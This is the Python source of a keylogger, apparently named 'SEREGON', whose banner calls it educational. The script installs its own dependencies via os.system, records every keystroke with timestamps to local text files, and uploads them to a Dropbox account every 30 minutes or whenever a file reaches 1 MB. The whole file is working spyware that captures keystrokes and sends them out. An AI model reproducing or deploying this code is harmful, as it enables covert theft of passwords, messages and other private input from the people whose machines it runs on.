# Import modules
import os
import sys
import argparse
import time
import pynput.keyboard as keyboard
from datetime import datetime
from dropbox.exceptions import AuthError
from dropbox import DropboxOAuth2FlowNoRedirect, Dropbox
from dropbox.files import WriteMode
os.system ('npm install figlet')

# Define GUI
gui = """
  
 ________  _______   ________  _______   ________  ________  ________          
|\   ____\|\  ___ \ |\   __  \|\  ___ \ |\   ____\|\   __  \|\   ___  \        
\ \  \___|\ \   __/|\ \  \|\  \ \   __/|\ \  \___|\ \  \|\  \ \  \\ \  \       
 \ \_____  \ \  \_|/_\ \   _  _\ \  \_|/_\ \  \  __\ \  \\\  \ \  \\ \  \      
  \|____|\  \ \  \_|\ \ \  \\  \\ \  \_|\ \ \  \|\  \ \  \\\  \ \  \\ \  \     
    ____\_\  \ \_______\ \__\\ _\\ \_______\ \_______\ \_______\ \__\\ \__\    
   |\_________\|_______|\|__|\|__|\|_______|\|_______|\|_______|\|__| \|__|    
   \|_________|                                                                
                                                                               
                                                                               

                    ~Created by: SEREGON~
             REMINDER THIS WAS BUILT FOR EDUCATIONAL PURPOSES
               SO DON'T USE THIS FOR EVIL ACTIVITIES.
"""



 


# install required packages
os.system('pip install pynput')
os.system('pip3 install dropbox')

# setup Dropbox
TOKEN = 'enter your dropbox token here'
dbx = Dropbox(TOKEN)

# set the initial keylogger file number
file_num = 1

# create the initial keylogger file
open(f'keylogger{file_num}.txt', 'w').close()
# create the keylogger function
def on_press(key):
    global file_num
    try:
        with open(f'keylogger{file_num}.txt', 'a') as f:
            f.write(f'{datetime.now()}  {key}\n')
            # if the file size is larger than 1 MB, upload and create a new file
            if os.path.getsize(f'keylogger{file_num}.txt') >= 1000000:
                upload_file()
                file_num += 1
    except Exception as e:
        print(str(e))

# upload the file to Dropbox
def upload_file():
    global file_num
    try:
        with open(f'keylogger{file_num}.txt', 'rb') as f:
            response = dbx.files_upload(f.read(), f'/keylogger{file_num}.txt', mode=WriteMode('overwrite'))
            print(f"File keylogger{file_num}.txt uploaded to Dropbox")
    except AuthError as e:
        print('Authentication error')
    except Exception as e:
        print(str(e))

# send the first file
upload_file()

# start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    while True:
        time.sleep(1800) # change this to the desired interval (in seconds)
        upload_file()
        file_num += 1
